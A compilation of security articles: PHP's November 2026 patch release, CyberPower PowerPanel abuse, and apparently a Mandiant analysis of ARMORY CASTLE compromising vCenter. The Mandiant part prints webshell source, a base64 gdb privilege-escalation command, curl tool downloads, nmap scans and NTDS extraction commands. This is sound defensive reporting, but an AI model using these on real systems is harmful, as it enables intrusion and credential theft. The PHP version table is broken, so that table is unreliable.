Title: PHP Patches 7 Critical Flaws, Including Session and PHP-FPM Remote Code Execution (CVE-2026-115560, CVE-2026-129289)
Context: 0 (released with the fixes) These ranges apply to CVE-2026-115560, CVE-2026-129289 and most of the other vulnerabilities in the release; a few affect only some branches (see below)
Full Text:
On November 19, 2026, the PHP project released PHP 8.2.36, 8.3.37, 8.4.28 and 8.5.13, fixing 17 vulnerabilities. Seven are rated critical by the PHP project (CVSS 4.0 9.2), including CVE-2026-115560, a session serializer mismatch that can lead to remote code execution, and CVE-2026-129289, a PHP-FPM request smuggling flaw that lets an unauthenticated attacker forge a backend request and execute attacker-controlled PHP code. PHP 8.6.0, released the same day, already includes the fixes.

PHP runs a large share of the world’s websites and web applications, in virtual machines, containers and managed platforms alike. CVE-2026-115560 was pre-announced in October, a few days after the PHP2Shell fixes (CVE-2026-109618, CVE-2026-109619), with the mitigation of disabling session upload progress. Today’s release publishes its full details and fixes it alongside 16 other vulnerabilities. Several of them need specific configurations, but the release as a whole affects every supported PHP branch.

PHP November 2026 security release: key facts

Fact

Detail

CVEs

17 in total; critical: CVE-2026-115560, CVE-2026-129289, CVE-2026-126714, CVE-2026-129496, CVE-2026-129481, CVE-2026-129474, CVE-2026-129182

Type

Deserialization of untrusted data (CWE-502) in the session extension; HTTP request smuggling (CWE-444) in PHP-FPM; several use-after-free bugs

Severity

Rated critical by the PHP project (CVSS 4.0 9.2) for all seven; NVD score pending

Required configuration

CVE-2026-115560: session upload progress enabled and mismatched session serializers. CVE-2026-129289: PHP-FPM behind a front end that reuses FastCGI connections

Affected versions

PHP 8.2.0 to 8.2.35, 8.3.0 to 8.3.36, 8.4.0 to 8.4.27 and 8.5.0 to 8.5.12 (some CVEs affect only some branches)

Fixed versions

8.2.36, 8.3.37, 8.4.28, 8.5.13; PHP 8.6.0 includes the fixes

Exposure

Internet-facing PHP applications; exploitability depends on configuration and on the application

Workaround

Set session.upload_progress.enabled = 0 (CVE-2026-115560); disable FastCGI connection reuse on the front end (CVE-2026-129289); other CVEs have their own workarounds

Exploitation

No known in-the-wild exploitation; a public proof of concept exists for CVE-2026-115560 in a lab setup

What is CVE-2026-115560?

CVE-2026-115560 is a flaw in PHP’s session upload progress feature. When a client uploads a file, PHP writes the upload’s progress into the user’s session, including a value the client controls. PHP supports several session serialization formats, and if that data is written in one format (php_serialize or php_binary) and later read in another (php), the reader can treat attacker-supplied bytes as serialized object data.

This can happen when an application switches session.serialize_handler at runtime before calling session_start(), or when separate applications, PHP-FPM pools, virtual hosts or command-line jobs with different settings share the same session storage. If the reading application has a suitable deserialization gadget chain, the attacker can execute code with the privileges of the PHP worker. According to the PHP advisory, the original report demonstrated command execution with a Guzzle gadget on PHP 8.2.35, 8.3.36, 8.4.27 and 8.5.12, and with a Monolog gadget.

The fix turns session upload progress off by default and blocks runtime changes to session settings while the feature is enabled. An explicit session.upload_progress.enabled = 1 in existing configuration still overrides the new default, and the PHP project notes that matching serializers across separate configurations is still the administrator’s responsibility.

What is CVE-2026-129289?

CVE-2026-129289 is an HTTP request smuggling flaw in PHP-FPM. When an application opens php://input but does not read the request body to the end, PHP can leave the unread bytes on a persistent FastCGI connection. An attacker can place a crafted FastCGI message in that body, and PHP-FPM accepts it as a new request that the web server never created or authorized.

The forged request controls FastCGI parameters, including the script to run and administrator-level PHP settings, which lets the attacker execute attacker-controlled PHP code as the worker in a single unauthenticated request, provided they know the path of an existing PHP script on the server. According to the PHP advisory, no non-default PHP setting, memory corruption or race condition is needed, and the bug has existed since PHP 5.6.0.

Exploitation requires a front end that reuses backend connections, such as nginx with fastcgi_keep_conn on, Apache mod_proxy_fcgi with enablereuse=on, or HAProxy FastCGI applications that keep connections open. Standard nginx and Apache configurations that close the FastCGI connection after each request are not affected by the demonstrated attack. LSAPI is affected by the same cleanup bug, but the advisory does not establish code execution through LSAPI.

Which PHP versions are affected?

PHP branch

Affected versions

8.5

8.6.0 (released with the fixes)

These ranges apply to CVE-2026-115560, CVE-2026-129289 and most of the other vulnerabilities in the release; a few affect only some branches (see below). PHP 8.1 and older are end of life and received no release, although the PHP project notes that older versions may also be affected (session upload progress was introduced in PHP 5.4.0). Linux distributions often backport fixes without changing the PHP version number, so check your distribution’s security tracker as well as the version string. PHP bundled in container images and application platforms needs its own update.

Additional vulnerabilities fixed in the same release

The other five critical vulnerabilities (all CVSS 4.0 9.2 according to the PHP project):

CVE-2026-126714 (8.2 to 8.5): partially overwritten session files can lead to remote code execution. Requires attacker influence over session data, an interrupted write and a gadget chain. Disabling session upload progress removes one input path but is not a full fix.

CVE-2026-129496 (8.2 to 8.5): a timezone cache use-after-free can lead to remote code execution. Requires a startup diagnostic and PHP error logging to a file; code execution was demonstrated locally in PHP-FPM and Apache mod_php under additional assumptions.

CVE-2026-129481 (8.3 to 8.5): use-after-free after an interrupted session shutdown. Code execution has not been demonstrated. Disabling session upload progress does not address it.

CVE-2026-129474 (8.5 only): use-after-free in magic method backtraces can lead to remote code execution, confirmed by the PHP project on PHP 8.5. It depends on the application and requires bypassing address randomization.

CVE-2026-129182 (8.5 only): use-after-free in the fatal error backtrace after shutdown. Code execution through this path has not been demonstrated.

The release also fixes four high-severity issues: a PHP-FPM epoll use-after-free that allows local privilege escalation to root when the FPM master runs as root (CVE-2026-129291, affecting configurations with catch_workers_output enabled, including the official PHP-FPM Docker images), a denial of service through folded HTTP response headers (CVE-2026-127960), mixed-case HTTPS and FTPS URLs that can send data in plaintext (CVE-2026-128064), and a PHAR signature bypass (CVE-2026-128090). Six medium-severity issues affect PHP-CGI, SOAP, DOM, the URI extension and the PHP-FPM status page.

Is there a patch for CVE-2026-115560 and CVE-2026-129289?

Yes. PHP 8.2.36, 8.3.37, 8.4.28 and 8.5.13 were released on November 19, 2026 and are available on the PHP downloads page. PHP 8.6.0, released the same day, includes the same fixes. Linux distributions, container image maintainers and hosting platforms that ship PHP need to release their own updated packages.

How to mitigate the PHP vulnerabilities

The best fix is to upgrade to the fixed release for your branch. Each critical vulnerability has a different workaround, and no single setting covers all of them.

Inventory: find every PHP installation, including PHP in container images, PHP-FPM pools and application platforms, and note which ones run PHP-FPM behind nginx, Apache or HAProxy.

Upgrade: move to PHP 8.2.36, 8.3.37, 8.4.28, 8.5.13 or 8.6.0, then restart the PHP master process and all workers.

CVE-2026-115560: set session.upload_progress.enabled = 0 in php.ini or the FPM pool configuration. Calling ini_set() from the application is too late. Check for explicit settings that re-enable it, even after upgrading.

CVE-2026-129289: disable FastCGI connection reuse: leave nginx fastcgi_keep_conn off, leave Apache enablereuse off, or configure other front ends to close the backend connection after each request. Never expose PHP-FPM listeners to untrusted networks.

CVE-2026-129474 and CVE-2026-129182 (PHP 8.5): set zend.exception_ignore_args = 1 or fatal_error_backtraces = 0.

CVE-2026-129496: fix configuration errors that produce startup warnings, or send PHP errors to syslog instead of a log file.

CVE-2026-129291: disable catch_workers_output in affected FPM pools, and avoid running the FPM master as root where possible.

Prioritize internet-facing PHP-FPM servers behind connection-reusing front ends, and applications that share session storage or change session settings at runtime.

Is CVE-2026-115560 being exploited in the wild?

There are no known reports of in-the-wild exploitation of any of the vulnerabilities, and none is listed in CISA’s Known Exploited Vulnerabilities catalog. A public proof-of-concept exploit for CVE-2026-115560 has been available on GitHub since October, but it targets a deliberately vulnerable lab application with a built-in gadget. With full technical details for all 17 vulnerabilities now public, especially for the PHP-FPM request smuggling flaw, exploit attempts are likely to follow.

How can Orca help?

Orca enables customers to quickly identify assets running vulnerable PHP versions, including PHP installed from OS packages and PHP bundled in container images, and to understand their exposure in context, including internet accessibility, runtime reachability and asset criticality, so they can prioritize remediation based on real risk rather than CVSS alone.

Title: CyberPower PowerPanel Exploited to Run Malicious Code on Domain Controller
Context: An attacker has abused CyberPower's PowerPanel Business (PBB) software to run malicious scripts on a domain controller, the server that controls logins across a Windows network,...
Full Text:
An attacker has abused CyberPower's PowerPanel Business (PBB) software to run malicious scripts on a domain controller, the server that controls logins across a Windows network, turning a power management feature into a remote command channel.

Symantec detailed the intrusion in research published November 18. PowerPanel Business manages uninterruptible power supply (UPS) battery backups. Because organizations rely on it to shut servers down safely in an outage, it often runs on important systems such as hypervisors and database and file servers.

How the UPS Software Was Abused

Administrators can configure PPB to launch a script when it detects a power problem, and its service executes that script with SYSTEM privileges, the highest level in Windows. Symantec said this meant the attacker could run code without a software bug and without setting up a service or scheduled task.

According to Symantec, the attacker uploaded scripts through the web console, then used them to stage an antivirus killer and copy the Active Directory database, which stores credentials for every account on the network. A persistent implant followed, loaded through DLL sideloading, in which a legitimate program is tricked into loading a malicious library.

The attacker leaned mostly on tools that ship with Windows, and the data collection scripts were rewritten several times during the intrusion. Symantec read that trial and error as a sign of a human operator working live.

Read more on management software attacks: Chinese State Actor Used AI to Compromise ConnectWise Tenants

What Defenders Should Check

Symantec did not say how the attacker got into the network or onto the PPB console. Possible routes to the console, it said, included stolen administrator credentials and previously disclosed weaknesses in the product, such as a default administrator password, hard-coded credentials and a file upload flaw.

Symantec said the feature "simply accepts a script, stores it, and runs it as SYSTEM." Since PPB often sits on the machines an attacker would prize most, it urged organizations to treat power-management software with the same suspicion as remote administration tools.

Its advice included limiting console access to specific administrator machines, keeping the console off the internet, replacing the default administrator password and staying patched. It also told organizations to check the folders PPB runs scripts from, assume any unfamiliar script is malicious, reset Active Directory credentials if indicators turned up and protect power-management hosts as high-value systems.

Symantec did not identify the victim or link the activity to any known group. With no data theft or ransomware seen, it said the attackers' motives remained unclear.

Title: PHP Releases Patches to Fix 18 Vulnerabilities
Context: The PHP Foundation has released security patches for a new set of 18 vulnerabilities, seven of which are marked critical
Full Text:
The PHP Foundation has released security patches for a new set of 18 vulnerabilities, seven of which are marked critical.

These vulnerabilities affect all supported PHP versions but require either non-default configuration or uncommon setups to be exploited.

This set of newly disclosed PHP vulnerabilities come a month after the disclosure of two critical flaws in PHP, tracked as CVE-2026-109618 and CVE-2026-109619 and collectively known as ‘PHP2Shell.’

This was not merely a theoretical risk. In the weeks following the disclosure, security researchers began documenting real-world exploitation attempts and compromises involving internet-facing systems, demonstrating the potential consequences of leaving vulnerable PHP installations unpatched.

For example, Check Point reported campaigns exploiting PHP2Shell against its own security gateways, dating back to 30 October. The attacks involved the deployment of backdoors and even destructive tools targeting VMware ESXi virtualisation servers.

The exploitation activity also extended to Palo Alto Networks firewalls, with attackers targeting devices whose administrative interfaces were exposed to the internet.

Of the flaws published in the November update one is a remote code execution (RCE) vulnerability in session upload progress, tracked as CVE-2026-115560. It was disclosed by PHP on October 23, two days after PHP released emergency fixes for the critical PHP2Shell vulnerabilities. It has been noted that exploitation of this vulnerability requires a highly specific and unlikely combination of conditions.

PHP Session Handling Flaws Enable Remote Code Execution

One of the new critical flaws, dubbed ‘PHPAfterShell’ and tracked as CVE-2026-126714, was discovered by security firm Depthfirst using AI frontier models tuned for cybersecurity tasks.

The vulnerability lives in PHP’s session handling with file-based storage, the default (session.save_handler = files).

By exploiting a flaw in this process, an attacker can manipulate a session while a file is being uploaded, potentially tricking the server into executing arbitrary code.

Successful exploitation could allow a remote attacker access to sensitive information, including login credentials and customer records, modify session data, spy on visitors or disrupt the affected service.

It affects the following versions:

PHP 8.5 < 8.5.13

PHP 8.4 < 8.4.28

PHP 8.3 < 8.3.37

PHP 8.2 < 8.2.36

PHP 8.1 and earlier are end-of-life

PHP Security Patches Address 16 Additional Vulnerabilities

The other vulnerabilities addressed in PHP’s 19 November 2026 security release include the following:

CVE-2026-129481 (CVSS 9.2): A use-after-free vulnerability triggered by an interrupted session shutdown, potentially allowing memory corruption and remote code execution

CVE-2026-129474 (CVSS 9.2): A use-after-free flaw in magic method backtraces that could allow attackers to execute arbitrary code

CVE-2026-129182 (CVSS 9.2): A use-after-free vulnerability involving the repopulation of the last fatal error backtrace after shutdown, potentially leading to remote code execution

CVE-2026-129496 (CVSS 9.2): A use-after-free vulnerability in the time zone cache that could potentially lead to remote code execution

CVE-2026-129501 (CVSS 6.3): A double-free vulnerability during DOM XML serialization that can cause memory corruption and denial of service

CVE-2026-129538 (CVSS 6.9): An out-of-bounds read and write vulnerability in PHP-CGI when correcting the PATH_INFO environment variable, potentially resulting in memory corruption

CVE-2026-129291 (CVSS 8.8): A use-after-free vulnerability in PHP-FPM's epoll event handling that could allow local privilege escalation

CVE-2026-129289 (CVSS 9.2): A request-smuggling vulnerability caused by unread HTTP request bodies, potentially allowing attackers to manipulate how requests are processed

CVE-2026-129292 (CVSS 5.3): A cross-site scripting (XSS) vulnerability in the PHP-FPM status endpoint, caused by insufficient escaping of user and script fields

CVE-2026-128090 (CVSS 7.7): An OpenSSL signature verification bypass caused by an algorithm downgrade, potentially allowing malicious PHAR archives to pass signature checks

CVE-2026-15353 (CVSS 6.3): An information disclosure vulnerability involving malformed array dimensions during SOAP processing

CVE-2026-129506 (CVSS 6.3): A use-after-free vulnerability when processing DTD entity references, potentially resulting in memory corruption

CVE-2026-128064 (CVSS 8.2): A vulnerability involving mixed-case HTTPS and FTPS URLs that could cause sensitive information to be transmitted in plaintext rather than encrypted

CVE-2026-127960 (CVSS 8.7): A denial-of-service vulnerability involving folded HTTP response headers, potentially allowing attackers to disrupt service availability

CVE-2026-129438 (CVSS 6.3): An incorrect RFC 3986 URI serialization vulnerability affecting oversized input, potentially resulting in invalid URI output

CVE-2026-48841 (CVSS not published): a vulnerability in the bundled uriparser library (a PHP third-party dependency) addressed by upgrading the dependency to version 1.0.3

PHP Ecosystem Projects Prepare Security Updates

The patches, published on November 19, are part of PHP’s regular four-week release cycle and come alongside the release of several versions of PHP (8.2.36, 8.3.37, 8.4.28, 8.5.13 and 8.6).

The PHP team warned users about the vulnerabilities and their forthcoming fixes on November 18.

Users are strongly encouraged to prepare to upgrade promptly once the releases become available. Technical details and fixed version numbers will be published alongside the releases.

Maintainers of open-source projects that rely on PHP have already been working to incorporate the security fixes into their software and distributions, helping ensure that patches reach downstream users as quickly as possible.

For instance, Kevin Dunglas, creator of FrankenPHP, a modern PHP application server built around the Caddy web server, said on X that the project is working with The PHP Foundation and Docker to provide updated builds as soon as the patched PHP version becomes available. These will include static binaries, RPM and DEB packages, Homebrew packages and Docker images based on Debian and Alpine Linux.

Meanwhile, Laravel, a popular open-source PHP framework used by developers to build websites, web applications and APIs, said on X it was already working on a remediation plan to protect applications running across its hosting and deployment services.

Title: ARMORY CASTLE Exploits vSphere
Context: ARMORY CASTLE exploited a zero-day vulnerability to gain access to the VMware server, and likely used an additional set of malware customized to this environment to conduct...
Full Text:
Written by: Jayson Frost, Bryce Greathouse, Dhanesh Kizhakkinan, John Palmisano, Steve Rasch, Daniel Sislo, John Wolfram Introduction On Oct. 15, 2026, Mandiant and Google Threat Intelligence Group (GTIG) published a blog post detailing recent activity in which the suspected PRC-nexus threat actor ARMORY CASTLE (formerly tracked as UNC5221) exploited CVE-2026-102764, a zero-day vulnerability in BeyondTrust Remote Support, which was patched in BT26-05. We also described some of the threat actor’s post-exploitation operations. In this blog we describe additional post-compromise activity involving the exploitation of a vulnerability in VMware vCenter and the deployment of additional malware families. On Nov. 19, 2026, VMware disclosed CVE-2026-123890, which impacts VMware vCenter Server deployments. vSphere consists of both ESXi (the hypervisor) and vCenter Server. The vCenter server is a centralized platform deployed as a Photon Linux virtual appliance and is used to configure, control, and monitor ESXi host environments. CVE-2026-123890 is an unauthenticated Secure Remote Password (SRP-6a) session key disclosure vulnerability over Distributed Computing Environment/Remote Procedure Calls (DCE/RPC). Successful exploitation results in a remote authentication bypass which creates an authenticated session established as administrator@vsphere.local. Using the authenticated administrator session, the attacker can execute arbitrary commands and acquire files, including the data.mdb database, by leveraging the vCenter Server Directory Service (vmdird) RPC interface vmdirdbcp. We strongly recommend that affected organizations immediately apply the security patches provided by Broadcom to remediate the vulnerability. ARMORY CASTLE exploited this vulnerability in early September 2026 using BONESAW, according to forensic evidence. BONESAW is a utility primarily built to facilitate remote exploitation written in Golang , which utilizes CVE-2026-123890 to exfiltrate the arbitrary Lightning Memory-Mapped Database (LMDB), hijack the SAML Security Token Service (STS), and create a Single Sign On (SSO) Administrator account. ARMORY CASTLE’s use of BONESAW represents significant new insight into this threat actor’s post-exploitation tactics. In this campaign, ARMORY CASTLE exploited two zero-days, and deployed three sets of malware specifically tailored for operating on targeted devices, indicating deep platform expertise and substantial resource backing. We are publishing this analysis, along with mitigation and hardening guidance, to support defenders in detecting this threat. Threat Detail Moving laterally from the Remote SupportRemote Support device, ARMORY CASTLE established a foothold on an internal Linux appliance, escalated privileges to root, and staged a suite of malware to support expanding access, persistence, and targeting of vCenter. ARMORY CASTLE exploited a zero-day vulnerability to gain access to the VMware server, and likely used an additional set of malware customized to this environment to conduct reconnaissance, credential theft, and data theft. Figure 1: ARMORY CASTLE lateral movement and vCenter compromise sequence of events Move Laterally Following the establishment of persistence and the deployment of lateral movement capabilities on the Remote Support appliance, Mandiant observed ARMORY CASTLE conducting internal reconnaissance. This reconnaissance was heavily focused on VMware systems, based on the specific ports ARMORY CASTLE scanned and the URIs the group visited such as /sdk and /ui. The group leveraged nmap to scan the internal environment for systems running open ports specific to VMware, namely ports 9080, 5480, and 2012. Notably, port 2012 is used as the control interface RPC for vCenter Single Sign-On (SSO) and is an integral part of ARMORY CASTLE’s remote exploitation of CVE-2026-123890 through BONESAW. /usr/sbin/nmap -sS -p 443,2012,389 --open .0/24 /usr/sbin/nmap -sS -p 443,2012,5480 --open .0/24 /usr/sbin/nmap -sS -p 443,9080 --open .0/24 /usr/sbin/nmap -sS -p 9080,2012 --open .0/24 /usr/sbin/nmap -sS -p 443,2012,389,445,3389,22,21 --open .0/24 Figure 2: ARMORY CASTLE nmap port scanning ARMORY CASTLE moved laterally to internal Linux appliances within the environment that lacked endpoint detection and response (EDR) tooling. ARMORY CASTLE deployed five newly identified malware families and utilities: the SLIMSAVAGE and CAGEMATCH webshells, the BEARBONES backdoor, the BONESAW remote exploitation utility, and the SAWSNAKE SAML utility. ARMORY CASTLE also deployed the LAZYBONES backdoor, which Mandiant and GTIG previously observed in a separate ARMORY CASTLE intrusion. Establish a Foothold To establish a foothold on the first Linux appliance, the actor dropped a webshell ActiveSer.jsp, tracked by Mandiant as SLIMSAVAGE. SLIMSAVAGE functions as an upgraded command execution webshell that utilizes the authentication secret pwd=123. if("123".equals(request.getParameter("pwd"))){ try{ ProcessBuilder pb = new ProcessBuilder("/bin/sh","-c",request.getParameter("i")); Process p = pb.start(); InputStream a = p.getInputStream(), b = p.getErrorStream(); int c; byte[] d = new byte[2048]; out.print("
"); while((c=a.read(d))!=-1){out.print(new String(d,0,c));} while((c=b.read(d))!=-1){out.print(new String(d,0,c));} out.print("
"); out.print("\nEXIT:"+p.waitFor()); }catch(Exception e){out.print("ERR:"+e);} } Figure 3: SLIMSAVAGE Webshell By leveraging ProcessBuilder("/bin/sh", "-c", ...), the SLIMSAVAGE webshell executed commands inside a command line interpreter, enabled shell pipelines, redirects, creation of environment variables, and chained execution. The webshell reads from both standard output (getInputStream()) and standard error (getErrorStream()), ensuring full diagnostic visibility. It also calls Process.waitFor() and appends the final process return code (\nEXIT:). Roughly 4 hours later, ARMORY CASTLE deployed an additional webshell to the Linux appliance, u.jsp, tracked as CAGEMATCH. While SLIMSAVAGE provided the group with a robust capability to execute commands on the appliance, the group was limited in their ability to transfer data. To solve this challenge, CAGEMATCH acts as a dedicated payload staging webshell. The webshell checks for a multipart/form-data request header, parses the boundary delimiter, and extracts raw file bytes along with the original filename. File f = new File("/tmp"); f.mkdirs(); File fout = new File(f, fname); try(FileOutputStream fos = new FileOutputStream(fout)){ fos.write(fd); } m = fout.getAbsolutePath(); Figure 4: CAGEMATCH File Staging Logic CAGEMATCH creates the /tmp directory if necessary, saves the uploaded payload directly to /tmp/, and echoes the absolute target path back to the client. When accessed without an upload payload, it returns a minimal HTML upload form. This provides the attacker with a streamlined post-exploitation workflow: using CAGEMATCH to upload binary payloads, scripts, or tools from the Remote Support appliance directly into /tmp, and subsequently invoke SLIMSAVAGE to adjust execution permissions and execute the staged tools. Escalate Privileges To escalate privileges to root on the Linux appliance, ARMORY CASTLE repeated the same escalation technique used on the Remote Support appliance through the enablement of Set User ID (SUID) permissions on the binary /bin/env. ARMORY CASTLE performed this permission modification using the GNU Debugger, gdb. By enabling SUID permissions on the binary /bin/env, any user would be allowed to execute commands as root. /bin/sh -c echo IWNobW9kIHUrcyAvYmluL2VudgpxCg==|base64 -d > /tmp/gdb_file /usr/bin/gdb -pid 113757 --command=/tmp/gdb_file Figure 5: ARMORY CASTLE gdb Privilege Escalation Move Laterally After successfully escalating privileges to root, ARMORY CASTLE began staging additional tooling on the Linux appliance to enable lateral movement within the environment. ARMORY CASTLE used curl to download the RAR utility from the Remote Support appliance. curl -o /tmp/rar -k https:///content/r.js Figure 6: ARMORY CASTLE downloads staged RAR utility ARMORY CASTLE then utilized curl to download a rar archive 123.rar which was subsequently extracted using their downloaded RAR binary. curl -o /tmp/123.rar -k https:///content/r.js ./rar x -p 123.rar Figure 7: ARMORY CASTLE extracts BONESAW Tracked as BONESAW, /tmp/123 is a remote exploitation utility written in Golang that leverages CVE-2026-123890 in vCenter to enable remote arbitrary LMDB exfiltration, SAML STS hijacking, and SSO administrator account creation. Mandiant observed ARMORY CASTLE leveraging this utility to target an internal vCenter server, successfully creating an SSO admin account, exfiltrating and parsing the LMDB which enabled lateral movement to the server. BONESAW achieves full system compromise against vCenter Server 7.x and 8.x appliances through the exploitation of CVE-2026-123890. This vulnerability exploits a cryptographic logic and authorization flaw in VMware's rpc_srp_verifier service over port 2012, exposing a shared session key that can be used to create authenticated sessions as administrator@vsphere.local. BONESAW also provides the ability to stream the raw underlying LMDB file for offline parsing, extract the VMware Security Token Service (STS) SAML private RSA signing key, create a backdoor machine account via vmdir, forge administrative SAML 2.0 assertion tokens, and assign Global Administrator privileges on the vCenter root folder via the vSphere SOAP API. While CVE-2026-123890 shares some overlap with CVE-2026-59309, primarily the obtaining of the shared session key "K" without knowing the password, there are multiple key differences between them. CVE-2026-59309 is a flaw in the vCenter Server vmdir daemon that allows a remote, unauthenticated attacker with network access to TCP ports 389 or 636 to send crafted LDAP packets with malformed authorization tokens, bypassing authentication to forge administrative sessions and create rogue Single Sign-On (SSO) accounts in the vSphere directory. Whereas CVE-2026-123890 is a flaw in the vmdir DCE/RPC interface that enables unauthenticated Secure Remote Password session key disclosure by exploiting predictable UUIDv1 timestamp generation in the SRP authentication interface, enabling the compromise of the SRP session key without knowing any passwords. Mandiant has evidence that ARMORY CASTLE had knowledge of CVE-2026-123890 prior to the disclosure of CVE-2026-59309 on July 29, 2026. Logs indicate that BONESAW was executed in early September 2026 against a vCenter server already patched against CVE-2026-59309, and the recovered Go binary contains a build timestamp of 2026-07-13T09:21:24Z (16 days before CVE-2026-59309 was disclosed), although Go build metadata can be modified prior to compilation. ARMORY CASTLE named BONESAW vcenter-db-teamcheck-go and compiled it in a Windows development environment based on Golang build artifacts: E:/CodeFiles/VulnScan/Vcenter/go_teamcheck/. BONESAW supports multiple command-line arguments, with primary functionality centered on the csa subcommand to remotely create an SSO admin account. Subcommand csa ("Create SSO admin with minimal parameters"): • Loads embedded default configuration template and parses CLI flags: • -h: Target vCenter address or vim25 SOAP endpoint (required). • -u: Username for the new SSO admin account (required). • -p: Password for the new SSO admin account (required). • -lu: Existing vCenter local admin UPN used for the vmdird bridge authentication (default: administrator@vsphere[.]local). • -d: Tenant/domain name for the created SSO account (default: vsphere[.]local). • -mdb-path: Path to an existing data.mdb file to skip remote database download. • -check-version: Probe target version and connectivity before executing the exploit chain. • -auto-d: Auto-discover SSO tenant/domain before running (overrides -d if discovery succeeds). Figure 8: BONESAW Command Line Arguments When executed utilizing the CSA command line flag, BONESAW creates the following files on disk: /temp/extracted_tenant_signer_/anon__data.mdb (Exfiltrated copy of /storage/db/vmware-vmdir/data.mdb) /temp/extracted_tenant_signer_/-tenantcredential-.key.pem (Extracted RSA private key in PEM format) /temp/extracted_tenant_signer_/-tenantcredential-.key.der (Extracted RSA private key in DER format) /temp/extracted_tenant_signer_/-tenantcredential-.leaf.pem (Extracted leaf X.509 signing certificate) /temp/extracted_tenant_signer_/-tenantcredential-.chain.pem (Extracted X.509 certificate chain) /temp/extracted_tenant_signer_/-tenantcredential-.context.json (Target SSO and signer metadata) Figure 9: BONESAW Filesystem Artifacts Shortly after the successful execution of BONESAW, ARMORY CASTLE staged and deployed an additional utility /tmp/sss tracked as SAWSNAKE to the Linux appliance. SAWSNAKE is a Golang utility that enables vCenter SAML authentication bypass and session cookie generation, ultimately enabling ARMORY CASTLE to conduct Golden SAML attacks against vCenter following the successful execution of BONESAW. This allows the threat actor to forge authentication tokens, bypass MFA, and impersonate any user. The core functionality of SAWSNAKE is a custom Go-based port of the Python-based vCenter SAML Login Tool from vcenter_saml_login.py. SAWSNAKE provides the ability to extract Identity Provider (IdP) signing keys and trusted certificates from a vCenter data.mdb database, export extracted credentials to PEM files on disk, forge and sign SAML 2.0 assertions for the Administrator account, and authenticate to a target vCenter server to obtain administrative session cookies. SAWSNAKE parses command-line arguments to determine its operating mode and supports the following command line arguments: -h, --help - show this help message and exit -p, --path PATH - Path to the data.mdb file (extract mode) -t, --target TARGET - The IP address of the target vCenter -k, --key KEY - IdP private key PEM file (direct-cert mode) -c, --cert CERTS - Trusted certificate PEM file. May be repeated; each file may contain one or more CERTIFICATE blocks. --domain DOMAIN - SSO domain (default: parse from certificate subject DC=) --hostname HOSTNAME - vCenter FQDN (default: read from vCenter SSL certificate) -e, --export-dir EXPORT_DIR - Parse data.mdb with --path and write the PEM files needed for the direct-cert mode to this directory, then exit. -v, --verbose - Print extracted/loaded certificates Figure 10: SAWSNAKE Command Line Arguments SAWSNAKE creates the following files on disk: /idp_key.pem /trusted_cert_2.pem /domain.txt Figure 11: Files created by SAWSNAKE Mandiant identified a second sample of SAWSNAKE that is likely an updated version. This sample added verbose debug logging to standard output across TLS, HTTP, SAML initiation, XML signing, and login routines, along with expanded redirect handling for up to 10 HTTP 302 redirects to support multi-hop authentication. Consistent with earlier activity, ARMORY CASTLE deleted SAWSNAKE and its output files from disk using rm. Shortly after the deployment of SAWSNAKE, ARMORY CASTLE leveraged an additional backdoor /tmp/dbr tracked as BEARBONES. BEARBONES is written in C and is based on the open-source Dropbear SSH Server. It is capable of bypassing system password authentication when using password-based authentication, logging plaintext credentials, and loading or generating server host keys from /tmp instead of the default directory /etc/dropbear. The authentication handler svr_auth_password for the packet type SSH_MSG_USERAUTH_REQUEST was backdoored to bypass /etc/shadow validation and grant access if the SHA-256 digest of the first 14 bytes of client password matches a hardcoded SHA-256 hash, while also logging plaintext credentials. Additionally, the internal version string and the session identification string were modified to “23345” and “SSH-2.0-pulsesecure_23345”. Pivoting on this SSH banner identified a suspected obfuscation network of compromised third-party firewalls and routers exposing SSH-2.0-pulsesecure_23345 on non-standard high TCP ports. ARMORY CASTLE executed BEARBONES several times from the Linux appliance, first attempting to open a listener on TCP port 53 and later on TCP port 33992. /tmp/dbr -R -p 53 /tmp/dbr -R -p 33992 Figure 12: BEARBONES Command Line Execution After the execution of BEARBONES to create a listener on TCP port 33992, ARMORY CASTLE moved laterally to the vCenter appliance as the Administrator and created a local administrator account named sps-@vsphere.local. Notably, ARMORY CASTLE enabled SSH on vCenter via the vCenter Server Appliance Management Interface (VAMI) API through a PUT request to /rest/appliance/access/ssh. Mandiant also observed this TTP during BRICKSTORM intrusions conducted by suspected PRC-nexus actor UNC6201. After enabling SSH, ARMORY CASTLE connected to the vCenter via SSH using the newly created local administrator account. ARMORY CASTLE then conducted credential theft, targeting the vCenter internal master crypto key file as well as the PostgreSQL password file using SSH. ARMORY CASTLE disabled the SSH service via the VAMI API immediately after extracting the vCenter master symmetric key and PostgreSQL database credentials. ARMORY CASTLE then was observed authenticating to ESXi Host Client (“ESXUI”) using the vpxuser account and also connected to it via SSH using the root account. Complete Mission ARMORY CASTLE used the WinSCP client to enumerate the ESXi file system, attached disks, mounted Virtual Machine File System (VMFS) volumes, and added an SSH public key to the root account’s authorized keys. ARMORY CASTLE conducted further reconnaissance and data theft on the ESXi filesystem using the root account. The actor was primarily observed enumerating directories and VMFS volumes. To stage and exfiltrate data from the ESXi filesystem, ARMORY CASTLE created a hidden directory, .a, on a VMFS volume to which they established an SCP connection to the ESXi using scp -r -d -t "/vmfs/volumes//.a". ARMORY CASTLE then staged and extracted a suspected VMware specific toolset onto the ESXi host using tar xzf vmfs-pydist.tar.gz. python vmfs_browser.py -d "/dev/disks/vml.:1" ls . python vmfs_browser.py -d "/dev/disks/vml.:1" info "-flat.vmdk" python vmfs_browser.py -d "/dev/disks/vml.:1" ls "-flat.vmdk:part2" python vmfs_browser.py -d "/dev/disks/vml.:1" extract "-flat.vmdk:part4/Windows/NTDS" ./NTDS python vmfs_browser.py -d "/dev/disks/vml.:1" extract "-flat.vmdk:part4/Windows/System32/config/SYSTEM" ./SYSTEM python vmfs_browser.py -d "/dev/disks/vml.:1" extract "-flat.vmdk:part4/Windows/System32/config/SECURITY" ./ python vmfs_browser.py -d "/dev/disks/vml.:1" extract "-flat.vmdk:part4/Windows/System32/dns" ./ Figure 13: ARMORY CASTLE reconnaissance of guest VMs ARMORY CASTLE then archived the extracted files into o.tar.gz, copied the archive from the ESXi filesystem using scp -r -p -d -f "o.tar.gz", and deleted the hidden .a directory. On the Linux appliance, ARMORY CASTLE staged the corresponding OpenSSH RSA private key at /tmp/123.key (matching the public key added to ESXi root authorized_keys) to authenticate outbound from the Linux appliance to ESXi over SSH without a password, alongside the BEARBONES SSH listener on the Linux appliance. From the Linux appliance, staged archives were downloaded via HTTP GET requests to the Remote Support appliance, from which ARMORY CASTLE likely exfiltrated the data. /usr/bin/ssh -x 